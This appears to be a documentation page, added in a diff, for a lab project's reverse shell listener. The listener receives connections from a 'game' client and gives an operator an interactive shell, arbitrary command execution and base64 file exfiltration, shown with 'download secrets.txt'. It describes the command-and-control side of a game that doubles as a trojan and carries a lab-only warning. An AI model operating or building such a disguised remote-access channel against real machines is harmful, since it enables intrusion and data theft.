@@ -1,0 +1,117 @@
+---
+title: 'Listener'
+description: 'Reverse shell listener that receives connections from the game and provides an interactive operator shell.'
+keywords: ['listener', 'reverse shell', 'operator', 'file download', 'connection']
+---
+
+The listener is a TCP server that waits for the game client to connect and then gives you an interactive shell session. All shell commands, file downloads, and directory navigation run through this connection.
+
+<Warning>
+Run the listener only inside a dedicated VM or lab environment. The game establishes a real reverse shell. Never run on a production machine or shared network. See [Lab Environment](/safety/lab-environment) for setup guidance.
+</Warning>
+
+## Start the listener
+
+```bash
+python tools/listener.py
+```
+
+The listener binds to `0.0.0.0:5050` using `SO_REUSEADDR`, so the port is immediately available again if you restart. It accepts one connection at a time (`server.listen(1)`).
+
+Once the game connects you will see:
+
+```
+[*] Listening on 0.0.0.0:5050
+[+] Connection received from 10.12.73.251
+
+operator@~ $
+```
+
+The prompt updates automatically as you navigate directories (see [Prompt and directory tracking](#prompt-and-directory-tracking) below).
+
+## Shell commands
+
+The listener translates a small set of cross-platform commands before sending them to the remote host.
+
+| Command | Description |
+|---|---|
+| `ls` | List files in the current directory (maps to `dir` on Windows) |
+| `cd <path>` | Change directory — the session tracks state across commands |
+| `cat <file>` | View a file's contents (maps to `type` on Windows) |
+| `pwd` | Print the current working path |
+| `download <file>` | Transfer a file to `tools/downloads/` on the operator machine |
+| `quit` | End the session and close the connection |
+
+<Tip>
+Any command not in the table above is forwarded to the remote shell as-is, so you can run arbitrary shell commands supported by the target OS.
+</Tip>
+
+## File download workflow
+
+<Steps>
+  <Step title="Issue the download command">
+    In the listener prompt, type:
+
+    ```bash
+    download secrets.txt
+    ```
+  </Step>
+  <Step title="Game packages the file">
+    The game reads the file, base64-encodes it, and sends it wrapped in a protocol envelope:
+
+    ```
+    [FILE_BEGIN:secrets.txt]<base64content>[FILE_END]
+    ```
+  </Step>
+  <Step title="Listener decodes and saves">
+    The listener detects the `[FILE_BEGIN:...]` tag, calls `base64.b64decode`, and writes the file to:
+
+    ```
+    tools/downloads/secrets.txt
+    ```
+
+    The directory is relative to your current working directory when you started the listener.
+  </Step>
+  <Step title="Confirmation">
+    The listener prints a confirmation line and returns you to the prompt:
+
+    ```
+    [+] Saved file: tools/downloads/secrets.txt
+    operator@target $
+    ```
+  </Step>
+</Steps>
+
+<Note>
+The `tools/downloads/` directory is created automatically on first use if it does not already exist.
+</Note>
+
+## Prompt and directory tracking
+
+The game sends `[PATH: /current/dir]` tags with every response. The listener strips these tags from displayed output and uses the path to update your prompt:
+
+```
+operator@target $ cd /var/log
+operator@log $
+```
+
+The prompt format is `operator@{dirname} $` where `{dirname}` is the last component of the remote path.
+
+## Heartbeat filtering
+
+The game sends `[HEARTBEAT]` packets every 15 seconds to keep the connection alive. These packets are automatically stripped from all output — you will never see them in your terminal.
+
+## Response timeout
+
+The listener waits up to **10 seconds** for a response after sending a command. If no data arrives within that window, it prints a timeout notice and returns you to the prompt without dropping the connection.
+
+## Reconnection behavior
+
+The listener runs an outer `while True` loop. When the connection drops (game exits, network interruption, etc.), the listener closes the old socket and immediately starts waiting for the next connection on the same port:
+
+```
+[-] Connection closed. Waiting for next connection...
+[*] Listening on 0.0.0.0:5050
+```
+
+You do not need to restart `listener.py` between game sessions.
